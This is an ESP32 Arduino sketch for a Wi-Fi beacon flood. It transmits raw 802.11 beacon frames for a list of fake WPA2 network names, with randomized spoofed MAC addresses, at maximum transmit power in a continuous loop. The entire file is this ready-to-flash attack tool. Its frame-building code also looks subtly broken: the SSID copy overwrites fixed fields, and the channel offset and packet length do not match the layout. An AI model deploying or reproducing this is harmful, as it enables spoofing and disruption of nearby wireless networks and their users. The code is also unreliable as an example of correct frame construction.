#include <Arduino.h>
#include <WiFi.h>
extern "C" {
  #include "esp_wifi.h"
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

// ==== EDIT ONLY THIS LIST ====
// Put your SSIDs here (max 32 chars each). Add or remove lines freely.
const char* ssidList[] = {
  "SSID_1",
  "SSID_2",
  "SSID_3",
  "SSID_4",
  "SSID_5",
  "SSID_6",
  "SSID_7",
  "SSID_8",
  "SSID_9"
};
const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

// ==== Tuning ====
const uint8_t wifi_channel = 6;     // fixed channel for visibility
const uint8_t beaconRepeat = 20;    // how many times to send each SSID per loop

// ==== Internals ====
uint8_t macAddr[6];
uint32_t packetCounter = 0, lastPrintTime = 0;

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }
void setMaxTxPower() { esp_wifi_set_max_tx_power(78); } // ~20.5 dBm

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  delay(100);
  randomSeed(esp_random());
  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  setMaxTxPower();
  Serial.println("Extreme SSID Beacon Flood (PlatformIO build)");
}

void loop() {
  for (int i = 0; i < ssidCount; i++) {
    const char* ssid = ssidList[i];
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    // Build a minimal beacon frame with dynamic SSID length
    uint8_t beaconPacket[128] = {
      0x80, 0x00, 0x00, 0x00,                         // Beacon Frame Control
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination: Broadcast
      0, 0, 0, 0, 0, 0,                               // Source MAC (filled below)
      0, 0, 0, 0, 0, 0,                               // BSSID (filled below)
      0x00, 0x00,                                     // Seq
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
      0xe8, 0x03,                                     // Interval
      0x31, 0x00,                                     // Capabilities

      0x00,                                           // SSID Tag
      0x00,                                           // SSID Length (set below)

      // Supported Rates (8)
      0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
      // DS Parameter Set (Channel)
      0x03, 0x01, 0x06,

      // RSN (WPA2)
      0x30, 0x18,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x02, 0x00,
      0x00, 0x0f, 0xac, 0x04,
      0x00, 0x0f, 0xac, 0x04,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x00, 0x00
    };

    const int ssidTagIdx = 36; // index of SSID Tag
    const int lenIdx     = 37; // index of SSID length
    const int ssidIdx    = 38; // index where SSID bytes start
    beaconPacket[lenIdx] = ssidLen;
    memcpy(&beaconPacket[ssidIdx], ssid, ssidLen);

    // set channel
    beaconPacket[70 + 2] = wifi_channel; // DS parameter set tag value

    // total size: header(38) + ssid(ssidLen) + rest(39)
    const int packetSize = 38 + ssidLen + 39;

    for (int r = 0; r < beaconRepeat; r++) {
      randomMac();
      memcpy(&beaconPacket[10], macAddr, 6); // Src MAC
      memcpy(&beaconPacket[16], macAddr, 6); // BSSID
      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false);
      packetCounter++;
    }
  }

  if (millis() - lastPrintTime > 1000) {
    Serial.printf("Packets/s: %lu\n", packetCounter);
    packetCounter = 0;
    lastPrintTime = millis();
  }
}